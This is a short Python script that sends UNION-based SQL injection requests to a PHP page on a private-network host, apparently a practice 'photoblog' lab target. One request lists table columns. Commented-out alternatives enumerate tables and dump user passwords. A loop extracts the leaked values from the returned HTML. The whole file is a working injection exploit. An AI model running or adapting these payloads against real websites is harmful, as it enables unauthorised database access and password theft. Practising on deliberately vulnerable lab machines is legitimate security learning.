from ctypes import sizeof
import requests 

r = requests.get("http://192.168.204.130/cat.php?id=1 union select 1,column_name,3,4 from information_schema.columns where table_name='pictures'")
#r = requests.get("http://192.168.204.130/cat.php?id=1 union select 1,table_name,3,4 from information_schema.tables where table_schema='photoblog'")
#r = requests.get("http://192.168.204.130/cat.php?id=1 union select 1,password,3,4 from photoblog.users")

data = r.text.split(' ')

for pos in data:
    if len(pos) >= 6:
        if pos[0] == "a":
            if pos[1] == "l":
                if pos[2] == "t":
                    print(pos.split("alt=")[1])